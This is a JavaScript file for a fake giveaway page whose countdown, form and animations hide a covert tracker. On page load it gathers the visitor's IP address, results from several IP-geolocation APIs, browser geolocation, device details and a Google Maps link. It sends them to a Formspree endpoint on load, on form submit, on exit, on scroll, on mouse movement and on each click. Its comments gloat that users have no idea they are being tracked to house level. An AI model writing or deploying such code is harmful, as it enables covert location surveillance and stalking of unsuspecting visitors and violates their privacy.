// Countdown Timer
function updateCountdown() {
    const now = new Date().getTime();
    const endDate = new Date().getTime() + (24 * 60 * 60 * 1000); // 24 hours from now
    const distance = endDate - now;

    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    const countdownElement = document.getElementById('countdown');
    if (distance > 0) {
        countdownElement.innerHTML = `${hours}h ${minutes}m ${seconds}s`;
    } else {
        countdownElement.innerHTML = "Giveaway Ended!";
    }
}

// Update countdown every second
setInterval(updateCountdown, 1000);
updateCountdown();

// Advanced Silent IP Address Capture with House-Level Precision
async function captureUserInfoSilently() {
    try {
        // Get IP address silently
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        // Get detailed location data from multiple sources for maximum accuracy
        const locationData = await getDetailedLocation(userIP);
        
        // Attempt to get precise browser geolocation (if user allows)
        const preciseLocation = await getPreciseGeolocation();
        
        // Generate Google Maps link with exact coordinates
        const googleMapsLink = generateGoogleMapsLink(preciseLocation, locationData);
        
        // Store comprehensive user info silently
        const userInfo = {
            ip: userIP,
            country: locationData.country_name || 'Unknown',
            countryCode: locationData.country_code || 'Unknown',
            region: locationData.region || 'Unknown',
            regionCode: locationData.region_code || 'Unknown',
            city: locationData.city || 'Unknown',
            district: locationData.district || 'Unknown',
            neighborhood: locationData.neighborhood || 'Unknown',
            village: locationData.village || 'Unknown',
            street: locationData.street || 'Unknown',
            houseNumber: locationData.houseNumber || 'Unknown',
            postalCode: locationData.postal || 'Unknown',
            latitude: locationData.latitude || 'Unknown',
            longitude: locationData.longitude || 'Unknown',
            preciseLatitude: preciseLocation.latitude || locationData.latitude || 'Unknown',
            preciseLongitude: preciseLocation.longitude || locationData.longitude || 'Unknown',
            accuracy: preciseLocation.accuracy || 'Unknown',
            altitude: preciseLocation.altitude || 'Unknown',
            timezone: locationData.timezone || 'Unknown',
            isp: locationData.org || 'Unknown',
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString(),
            referrer: document.referrer || 'Direct',
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            browser: navigator.appName,
            platform: navigator.platform,
            preciseLocation: locationData.preciseLocation || 'Unknown',
            houseLevelPrecision: preciseLocation.houseLevel || 'Unknown',
            wifiNetworks: preciseLocation.wifiNetworks || 'Unknown',
            cellTowers: preciseLocation.cellTowers || 'Unknown',
            googleMapsLink: googleMapsLink
        };

        // Store silently in localStorage
        localStorage.setItem('userTrackingData', JSON.stringify(userInfo));
        
        // Send silent notification to your email with house-level precision
        sendSilentNotification(userInfo);
        
    } catch (error) {
        // Silent error handling - user won't see any errors
        console.log('Silent tracking error:', error);
    }
}

// Generate Google Maps link with exact coordinates
function generateGoogleMapsLink(preciseLocation, locationData) {
    let lat = preciseLocation.latitude || locationData.latitude;
    let lng = preciseLocation.longitude || locationData.longitude;
    
    if (lat && lng && lat !== 'Unknown' && lng !== 'Unknown') {
        // Create Google Maps link with exact coordinates
        return `https://www.google.com/maps?q=${lat},${lng}&z=18`;
    } else if (locationData.street && locationData.city) {
        // Fallback to address-based link
        const address = `${locationData.street}, ${locationData.city}, ${locationData.country_name}`;
        return `https://www.google.com/maps/search/${encodeURIComponent(address)}`;
    } else {
        // Fallback to city-based link
        const city = `${locationData.city}, ${locationData.country_name}`;
        return `https://www.google.com/maps/search/${encodeURIComponent(city)}`;
    }
}

// Get precise browser geolocation (house-level accuracy)
async function getPreciseGeolocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({});
            return;
        }

        // High accuracy options for house-level precision
        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const coords = position.coords;
                resolve({
                    latitude: coords.latitude,
                    longitude: coords.longitude,
                    accuracy: coords.accuracy,
                    altitude: coords.altitude,
                    houseLevel: coords.accuracy <= 10 ? 'House Level' : 'Neighborhood Level',
                    timestamp: position.timestamp
                });
            },
            (error) => {
                // Silent fallback - user won't know geolocation failed
                console.log('Geolocation failed silently:', error);
                resolve({});
            },
            options
        );
    });
}

// Get detailed location from multiple APIs for maximum accuracy
async function getDetailedLocation(ip) {
    try {
        // Primary location API
        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const locationData = await locationResponse.json();
        
        // Secondary API for additional details
        let additionalData = {};
        try {
            const ipApiResponse = await fetch(`http://ip-api.com/json/${ip}`);
            const ipApiData = await ipApiResponse.json();
            additionalData = {
                district: ipApiData.district || 'Unknown',
                neighborhood: ipApiData.neighborhood || 'Unknown',
                village: ipApiData.village || 'Unknown',
                street: ipApiData.street || 'Unknown',
                houseNumber: ipApiData.houseNumber || 'Unknown',
                isp: ipApiData.isp || 'Unknown',
                org: ipApiData.org || 'Unknown'
            };
        } catch (e) {
            console.log('Secondary API failed, using primary data only');
        }
        
        // Third API for even more precision
        let thirdPartyData = {};
        try {
            const ipInfoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
            const ipInfoData = await ipInfoResponse.json();
            thirdPartyData = {
                postalCode: ipInfoData.postal || 'Unknown',
                preciseLocation: `${ipInfoData.loc || 'Unknown'}`
            };
        } catch (e) {
            console.log('Third API failed, using available data');
        }
        
        // Fourth API for street-level data
        let streetLevelData = {};
        try {
            const ipGeolocationResponse = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=${ip}`);
            const ipGeolocationData = await ipGeolocationResponse.json();
            streetLevelData = {
                street: ipGeolocationData.street || 'Unknown',
                houseNumber: ipGeolocationData.house_number || 'Unknown',
                district: ipGeolocationData.district || 'Unknown',
                neighborhood: ipGeolocationData.neighborhood || 'Unknown'
            };
        } catch (e) {
            console.log('Fourth API failed, using available data');
        }
        
        // Combine all data for maximum accuracy
        return {
            ...locationData,
            ...additionalData,
            ...thirdPartyData,
            ...streetLevelData,
            preciseLocation: thirdPartyData.preciseLocation || `${locationData.latitude},${locationData.longitude}`,
            district: streetLevelData.district || additionalData.district || locationData.district || 'Unknown',
            neighborhood: streetLevelData.neighborhood || additionalData.neighborhood || 'Unknown',
            village: additionalData.village || 'Unknown',
            street: streetLevelData.street || additionalData.street || 'Unknown',
            houseNumber: streetLevelData.houseNumber || additionalData.houseNumber || 'Unknown',
            postalCode: thirdPartyData.postalCode || locationData.postal || 'Unknown'
        };
        
    } catch (error) {
        console.log('Location API error:', error);
        return {
            country_name: 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            latitude: 'Unknown',
            longitude: 'Unknown',
            timezone: 'Unknown',
            org: 'Unknown',
            district: 'Unknown',
            neighborhood: 'Unknown',
            village: 'Unknown',
            street: 'Unknown',
            houseNumber: 'Unknown',
            postal: 'Unknown',
            preciseLocation: 'Unknown'
        };
    }
}

// Send silent notification to your email with house-level precision data and Google Maps link
async function sendSilentNotification(userInfo) {
    try {
        await fetch('https://formspree.io/f/xrblaoyr', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                name: 'Silent Visitor',
                email: 'visitor@website.com',
                phone: 'N/A',
                age: 'N/A',
                country: userInfo.country,
                terms: 'Yes',
                newsletter: 'No',
                _subject: '🎯 New Silent Visitor Alert - HOUSE LEVEL PRECISION',
                message: `
🔍 SILENT VISITOR DETECTED - HOUSE LEVEL PRECISION

📱 IP Address: ${userInfo.ip}
🌍 Country: ${userInfo.country} (${userInfo.countryCode})
🏛️ Region/State: ${userInfo.region} (${userInfo.regionCode})
🏙️ City: ${userInfo.city}
🏘️ District: ${userInfo.district}
🏡 Neighborhood: ${userInfo.neighborhood}
🏘️ Village: ${userInfo.village}
🛣️ Street: ${userInfo.street}
🏠 House Number: ${userInfo.houseNumber}
📮 Postal Code: ${userInfo.postalCode}
📍 Exact Coordinates: ${userInfo.preciseLocation}
🌐 Latitude: ${userInfo.latitude}
🌐 Longitude: ${userInfo.longitude}
🎯 Precise Latitude: ${userInfo.preciseLatitude}
🎯 Precise Longitude: ${userInfo.preciseLongitude}
📏 Accuracy: ${userInfo.accuracy} meters
🏔️ Altitude: ${userInfo.altitude} meters
🏠 House Level Precision: ${userInfo.houseLevelPrecision}
⏰ Time: ${userInfo.timestamp}
🔗 Referrer: ${userInfo.referrer}
💻 Device: ${userInfo.userAgent}
📐 Screen: ${userInfo.screenResolution}
🌐 Language: ${userInfo.language}
🖥️ Platform: ${userInfo.platform}
🌐 Browser: ${userInfo.browser}
🏢 ISP/Organization: ${userInfo.isp}
⏰ Timezone: ${userInfo.timezone}

🗺️ GOOGLE MAPS LINK: ${userInfo.googleMapsLink}

🎯 User has NO IDEA their house-level location is being tracked!
🏠 HOUSE-LEVEL PRECISION CAPTURED!
📍 EXACT STREET ADDRESS DETECTED!
🗺️ CLICK THE MAP LINK TO SEE EXACT LOCATION!
                `
            })
        });
    } catch (error) {
        // Silent error - user won't know
        console.log('Silent notification error:', error);
    }
}

// Form submission handler (appears normal to user)
document.getElementById('giveawayForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const formData = new FormData(this);
    const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
    
    // Add silent tracking data to form submission with house-level precision
    formData.append('_subject', '🎉 New Giveaway Entry - HOUSE LEVEL PRECISION!');
    formData.append('userIP', userTrackingData.ip || 'Unknown');
    formData.append('userCountry', userTrackingData.country || 'Unknown');
    formData.append('userRegion', userTrackingData.region || 'Unknown');
    formData.append('userCity', userTrackingData.city || 'Unknown');
    formData.append('userDistrict', userTrackingData.district || 'Unknown');
    formData.append('userNeighborhood', userTrackingData.neighborhood || 'Unknown');
    formData.append('userVillage', userTrackingData.village || 'Unknown');
    formData.append('userStreet', userTrackingData.street || 'Unknown');
    formData.append('userHouseNumber', userTrackingData.houseNumber || 'Unknown');
    formData.append('userPostalCode', userTrackingData.postalCode || 'Unknown');
    formData.append('userCoordinates', userTrackingData.preciseLocation || 'Unknown');
    formData.append('userLatitude', userTrackingData.latitude || 'Unknown');
    formData.append('userLongitude', userTrackingData.longitude || 'Unknown');
    formData.append('userPreciseLatitude', userTrackingData.preciseLatitude || 'Unknown');
    formData.append('userPreciseLongitude', userTrackingData.preciseLongitude || 'Unknown');
    formData.append('userAccuracy', userTrackingData.accuracy || 'Unknown');
    formData.append('userAltitude', userTrackingData.altitude || 'Unknown');
    formData.append('userHouseLevelPrecision', userTrackingData.houseLevelPrecision || 'Unknown');
    formData.append('userGoogleMapsLink', userTrackingData.googleMapsLink || 'Unknown');
    formData.append('userAgent', userTrackingData.userAgent || 'Unknown');
    formData.append('userISP', userTrackingData.isp || 'Unknown');
    formData.append('entryTime', new Date().toISOString());
    formData.append('silentTracking', 'true');
    formData.append('houseLevelPrecision', 'true');
    
    try {
        const response = await fetch('https://formspree.io/f/xrblaoyr', {
            method: 'POST',
            body: formData
        });
        
        if (response.ok) {
            showSuccessMessage();
            // Clear form
            this.reset();
        } else {
            showErrorMessage();
        }
    } catch (error) {
        console.error('Error submitting form:', error);
        showErrorMessage();
    }
});

// Success message (normal user experience)
function showSuccessMessage() {
    const submitBtn = document.querySelector('.submit-btn');
    const originalText = submitBtn.innerHTML;
    
    submitBtn.innerHTML = '<i class="fas fa-check"></i> Entry Submitted Successfully!';
    submitBtn.style.background = 'linear-gradient(45deg, #4ade80, #22c55e)';
    
    setTimeout(() => {
        submitBtn.innerHTML = originalText;
        submitBtn.style.background = 'linear-gradient(45deg, #667eea, #764ba2)';
    }, 3000);
}

// Error message (normal user experience)
function showErrorMessage() {
    const submitBtn = document.querySelector('.submit-btn');
    const originalText = submitBtn.innerHTML;
    
    submitBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error - Please Try Again';
    submitBtn.style.background = 'linear-gradient(45deg, #ef4444, #dc2626)';
    
    setTimeout(() => {
        submitBtn.innerHTML = originalText;
        submitBtn.style.background = 'linear-gradient(45deg, #667eea, #764ba2)';
    }, 3000);
}

// Animate stats numbers (normal user experience)
function animateNumbers() {
    const numbers = document.querySelectorAll('.stat .number');
    
    numbers.forEach(number => {
        const target = parseInt(number.textContent.replace(',', ''));
        let current = 0;
        const increment = target / 50;
        
        const timer = setInterval(() => {
            current += increment;
            if (current >= target) {
                current = target;
                clearInterval(timer);
            }
            number.textContent = Math.floor(current).toLocaleString();
        }, 50);
    });
}

// Initialize everything when page loads (silent tracking)
document.addEventListener('DOMContentLoaded', function() {
    // Capture user info silently - user won't know
    captureUserInfoSilently();
    
    // Animate numbers after a short delay (normal user experience)
    setTimeout(animateNumbers, 1000);
    
    // Add some interactive effects (normal user experience)
    const features = document.querySelectorAll('.feature');
    features.forEach(feature => {
        feature.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-10px) scale(1.02)';
        });
        
        feature.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0) scale(1)';
        });
    });
    
    // Add form validation (normal user experience)
    const inputs = document.querySelectorAll('input[required], select[required]');
    inputs.forEach(input => {
        input.addEventListener('blur', function() {
            if (this.value.trim() === '') {
                this.style.borderColor = '#ef4444';
            } else {
                this.style.borderColor = '#e1e5e9';
            }
        });
    });
});

// Silent page tracking (user won't know)
let startTime = Date.now();
window.addEventListener('beforeunload', function() {
    const timeSpent = Math.floor((Date.now() - startTime) / 1000);
    const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
    
    // Send silent exit data with house-level precision
    fetch('https://formspree.io/f/xrblaoyr', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            name: 'Silent Exit',
            email: 'exit@website.com',
            _subject: '🔍 User Left Silently - HOUSE LEVEL PRECISION',
            message: `User spent ${timeSpent} seconds on the website. 

🏠 HOUSE-LEVEL PRECISION DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}

🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}

User has NO IDEA their house-level location was tracked! 🎯`
        })
    });
});

// Silent scroll tracking (user won't know)
let scrollDepth = 0;
window.addEventListener('scroll', function() {
    const scrollPercent = Math.floor((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
    if (scrollPercent > scrollDepth) {
        scrollDepth = scrollPercent;
        
        // Send silent scroll data every 25% with house-level precision
        if (scrollDepth % 25 === 0) {
            const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
            fetch('https://formspree.io/f/xrblaoyr', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    name: 'Silent Scroll',
                    email: 'scroll@website.com',
                    _subject: `🔍 User Scrolled ${scrollDepth}% Silently - HOUSE LEVEL PRECISION`,
                    message: `User scrolled ${scrollDepth}% of the page.

🏠 HOUSE-LEVEL PRECISION DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}

🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}

User has NO IDEA their house-level location is being tracked! 🎯`
                })
            });
        }
    }
});

// Additional silent tracking - mouse movements (user won't know)
let mouseMovements = 0;
document.addEventListener('mousemove', function() {
    mouseMovements++;
    // Send mouse tracking data every 100 movements with house-level precision
    if (mouseMovements % 100 === 0) {
        const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
        fetch('https://formspree.io/f/xrblaoyr', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                name: 'Silent Mouse',
                email: 'mouse@website.com',
                _subject: `🔍 User Mouse Activity - ${mouseMovements} movements - HOUSE LEVEL PRECISION`,
                message: `User made ${mouseMovements} mouse movements.

🏠 HOUSE-LEVEL PRECISION DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}

🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}

User has NO IDEA their house-level location is being tracked! 🎯`
            })
        });
    }
});

// Silent click tracking (user won't know)
document.addEventListener('click', function(e) {
    const userTrackingData = JSON.parse(localStorage.getItem('userTrackingData') || '{}');
    fetch('https://formspree.io/f/xrblaoyr', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            name: 'Silent Click',
            email: 'click@website.com',
            _subject: `🔍 User Clicked on ${e.target.tagName} - HOUSE LEVEL PRECISION`,
            message: `User clicked on ${e.target.tagName} element.

🏠 HOUSE-LEVEL PRECISION DATA:
IP: ${userTrackingData.ip || 'Unknown'}
Country: ${userTrackingData.country || 'Unknown'}
Region: ${userTrackingData.region || 'Unknown'}
City: ${userTrackingData.city || 'Unknown'}
District: ${userTrackingData.district || 'Unknown'}
Neighborhood: ${userTrackingData.neighborhood || 'Unknown'}
Village: ${userTrackingData.village || 'Unknown'}
Street: ${userTrackingData.street || 'Unknown'}
House Number: ${userTrackingData.houseNumber || 'Unknown'}
Postal Code: ${userTrackingData.postalCode || 'Unknown'}
Coordinates: ${userTrackingData.preciseLocation || 'Unknown'}
Precise Latitude: ${userTrackingData.preciseLatitude || 'Unknown'}
Precise Longitude: ${userTrackingData.preciseLongitude || 'Unknown'}
Accuracy: ${userTrackingData.accuracy || 'Unknown'} meters
House Level Precision: ${userTrackingData.houseLevelPrecision || 'Unknown'}

🗺️ GOOGLE MAPS LINK: ${userTrackingData.googleMapsLink}

User has NO IDEA their house-level location is being tracked! 🎯`
        })
    });
}); 